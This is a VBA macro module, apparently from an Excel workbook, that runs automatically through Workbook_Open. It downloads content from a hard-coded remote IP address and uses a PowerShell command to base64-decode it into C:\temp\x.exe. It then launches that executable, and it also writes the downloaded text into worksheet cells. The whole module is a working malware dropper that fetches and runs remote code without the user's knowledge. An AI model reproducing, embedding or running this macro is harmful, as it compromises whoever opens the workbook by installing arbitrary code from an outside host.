Function DownloadWebContent(strUrl As String) As String
    Dim objHTTP As Object
    Dim strContent As String
    
    ' Create the WinHttpRequest object
    Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    
    ' Open the URL
    objHTTP.Open "GET", strUrl, False
    
    ' Send the request
    objHTTP.send
    
    ' Get the response
    strContent = objHTTP.responseText
    
    ' Print the content to Immediate Window
    Debug.Print strContent
    
    ' Clean up
    Set objHTTP = Nothing
    
    DownloadWebContent = strContent
    
End Function


Sub OpenFile()
    Dim ProgramPath As String
    ProgramPath = "C:\temp\x.exe" ' Path to the program
    Call Shell(ProgramPath, vbNormalFocus)
End Sub
Sub RunPowerShellUsingShell(psCommand As String)
    ' Run the command
    Shell psCommand, vbNormalFocus
End Sub

Sub SaveHTMLToCells(mystr As String)
    Dim htmlLines() As String
    Dim i As Long

    ' Split the HTML content by "<" to get each tag
    htmlLines = Split(mystr, "<")
    
    ' Write each tag to a new cell in the active worksheet
    For i = LBound(htmlLines) To UBound(htmlLines)
        If htmlLines(i) <> "" Then
            ActiveSheet.Cells(i + 1, 1).Value = "<" & htmlLines(i)
        End If
    Next i
End Sub
Sub MainSub()
    Dim mystr As String
    Dim myHost As String
    Dim comm As String
    myHost = "http://175.45.176.100"
    mystr = DownloadWebContent(myHost)
    comm = "powershell -command ""[IO.File]::WriteAllBytes(""C:\temp\x.exe"", [Convert]::FromBase64String(" & mystr & "))"""
    SaveHTMLToCells (mystr)
    RunPowerShellUsingShell (comm)
    OpenFile
    
End Sub

Private Sub Workbook_Open()
    MainSub
End Sub

